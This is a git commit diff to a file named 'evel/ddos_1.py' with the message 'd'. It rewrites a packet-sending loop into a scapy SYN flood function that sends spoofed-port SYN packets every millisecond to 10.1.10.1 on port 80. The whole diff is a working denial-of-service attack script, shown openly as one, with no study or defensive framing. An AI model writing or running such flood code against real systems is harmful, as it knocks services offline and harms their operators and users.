1f8c3cac63e574fee42140462a8ab41802f730b4
13Igrok <47218346+13Igrok@users.noreply.github.com>
2023-11-04 21:31:19 +0300

    d

--- evel/ddos_1.py
+++ evel/ddos_1.py
@@ -1,11 +1,11 @@
-import time
+from scapy.all import *
 
-import scapy
+def send_syn_flood(target_ip, target_port):
+    ip = IP(dst=target_ip)
+    syn_packet = TCP(sport=RandShort(), dport=target_port, flags='S')
+    syn_flood = ip / syn_packet
+    send(syn_flood, inter=0.001)
 
-target_ip = "10.1.10.1"
-packet_count = 1000
-
-for i in range(packet_count):
-    packet = scapy.IP(dst=target_ip)/scapy.TCP(dport=80)
-    scapy.send(packet)
-    time.sleep(0.1)
+target_ip = '10.1.10.1'
+target_port = 80
+send_syn_flood(target_ip, target_port)
